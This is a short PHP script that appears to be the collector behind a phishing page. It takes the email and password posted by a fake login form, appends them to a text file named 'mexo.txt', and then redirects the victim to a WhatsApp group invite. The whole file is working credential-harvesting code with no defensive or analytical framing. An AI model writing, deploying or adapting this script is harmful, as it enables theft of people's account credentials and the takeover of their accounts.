<?php
$Username=$_POST['email'];
$Password=$_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR'];
$time=time();
$gmt='+7';
$jm='3600';
$var=$time+($gmt*$jm);
$now=gmdate('d M Y - H:i',$var);

$handle=fopen('mexo.txt',a);
$save=fwrite($handle,'
Username : '.$Username.'
Password : '.$Password.'
');
fclose($handle);
echo '
<head>
<meta http-equiv="Refresh" content="0; URL=https://chat.whatsapp.com/JjXTbDyM16Y4c1pxJSiD5X"/>
</head><body>
</body>
</html>
';


?>